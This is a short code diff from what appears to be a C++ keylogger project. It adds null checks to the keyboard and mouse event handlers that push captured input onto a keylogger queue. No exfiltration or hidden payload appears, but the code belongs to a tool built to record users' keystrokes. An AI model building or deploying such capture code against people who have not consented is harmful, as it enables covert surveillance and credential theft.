@@ -21,8 +21,10 @@ EventManager::~EventManager()
  * @return void
  */
 void					EventManager::handleKeyboardEvent(const WPARAM wParam, const LPARAM lParam) const{
-	
-	const AEvent* event = EventFactory::createKeyboardEvent(wParam, lParam, *updateContext());
+	const t_Context *context = updateContext();
+	if (context == NULL)
+		return;
+	const AEvent* event = EventFactory::createKeyboardEvent(wParam, lParam, *context);
 	_keylogger.pushToQueue(event);
     return;
 }
@@ -34,7 +36,10 @@ void					EventManager::handleKeyboardEvent(const WPARAM wParam, const LPARAM lPa
 * @return void
 */
 void					EventManager::handleMouseEvent(const WPARAM wParam, const LPARAM lParam) const {
-	const AEvent* event = EventFactory::createMouseEvent(wParam, lParam, *updateContext());
+	const t_Context *context = updateContext();
+	if (context == NULL)
+		return;
+	const AEvent* event = EventFactory::createMouseEvent(wParam, lParam, *context);
 	_keylogger.pushToQueue(event);
 	return;
 }
